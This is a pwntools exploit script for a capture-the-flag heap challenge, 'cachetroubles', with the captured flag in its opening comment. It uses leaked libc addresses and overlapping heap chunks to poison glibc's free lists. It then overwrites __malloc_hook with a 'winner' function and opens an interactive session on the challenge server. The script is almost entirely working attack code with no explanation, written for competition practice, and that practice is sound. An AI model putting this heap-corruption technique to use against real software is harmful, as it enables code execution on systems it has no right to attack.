#flag = p_ctf{h00k3d_70_7h3_h34p}
from pwn import *

elf = ELF("./cachetroubles")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("chall.ctf.pragyan.org", 30102)

def sla(s, d):
	target.sendlineafter(s, d)

def add(size, content):
	sla(">", "1")
	sla(">", str(size))
	sla(">", content)

def rem(idx):
	sla(">", "2")
	sla(">", str(idx))


target.recvuntil(": ")
winner = int(target.recvline().strip(), 0x10)
#log.info("Winner: " + hex(winner))

target.recvuntil(": ")
system = int(target.recvline().strip(), 0x10)
libc_base = system - libc.sym['system']
#log.info("System: " + hex(system))

add(0x410, "A"*0x28)											#0
add(0x410, "B"*0x48)											#1
add(0x68, "C"*0x18)												#2
add(0x68, "C"*0x18)												#3

rem(0)
rem(1)

add(0x3c0, "A"*0x38)											#4
add(0x68, "JUNK"*4 + "J"*0x38 + "\x21\x05")						#5

rem(1)
rem(3)
rem(2)

add(0x420, "B"*0x48)											#6

rem(2)

add(0x68, p64(libc_base + libc.sym['__malloc_hook'] - 8))		#7
add(0x68, "JUNK")												#8
add(0x68, "whoamiT_" + p64(winner))								#9

sla(">", "1")
sla(">", "1337")

target.interactive()